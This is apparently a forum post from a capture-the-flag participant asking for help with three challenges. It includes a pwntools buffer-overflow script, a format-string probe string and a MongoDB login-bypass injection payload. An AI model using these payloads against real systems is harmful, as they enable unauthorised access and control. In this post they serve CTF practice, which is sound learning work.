There are 3 challenges which I feel I can do but not able to figure out my mistake(s)<br>
#Smashing Profit!
From what I understood we have to exploit buffer overflow vulnerablity. Using gdb I found that eip gets overwritten after string length 76.<br>
So I made a script to send the payload but it gave me segmentation fault. Can't figure out where I'm wrong.
```
from pwn import *
import time

shell = ssh(host='shell.icec.tf',user='<user id>',password='<password>')
sh=shell.run("sh")
sh.sendline("cd /home/profit/")
sh.sendline("./profit")
time.sleep(1)
data='A'*76
data+=p32(0x0804850b)
print "sending "+data
sh.sendline(data+"\n")
print sh.recv(timeout=5)
```
#Dear diary
Format string vulnerablity<br>
In the main function flag() is called which should put the flag on the stack. But looking at the stack through gdb in the print entry function shows no sign of it :/<br>
So, %08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x doesn't give anything but junk.

#ChainedIn
I was able to login as administrator by modifying the post data, which was a JSON, to {"user":{"$gt":" "},"pass":{"$gt":" "}} as the website was adding slashes on the client side only.<br>
This mongo injection was successful but I can't figure out how to get the password. Probably has something to do with template injections.
